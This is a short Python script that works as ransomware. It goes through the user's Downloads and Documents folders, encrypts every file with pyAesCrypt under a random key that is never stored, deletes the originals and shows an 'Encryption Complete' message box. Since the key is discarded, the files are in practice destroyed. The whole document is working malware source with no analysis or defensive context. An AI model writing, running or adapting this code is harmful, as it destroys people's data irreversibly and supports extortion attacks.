import os
import shutil
import pyAesCrypt
import secrets
import tkinter as tk
from tkinter import messagebox
from pathlib import Path
import requests

folders_path = [
    str(os.path.join(Path.home(), "Downloads")),
    str(os.path.join(Path.home(), "Documents"))
]

key = secrets.token_hex(16)

bufferSize = 64*1024
for folder_path in folders_path:
    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)
        if not file.endswith(".aes"):
            pyAesCrypt.encryptFile(file_path, file_path+".aes", key, bufferSize)
            destination_path = os.path.join(folder_path,"encrypted_"+file+".aes")
            shutil.move(file_path+".aes", destination_path)
            os.remove(file_path)

root = tk.Tk()
root.withdraw()
root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted. ")
root.mainloop()
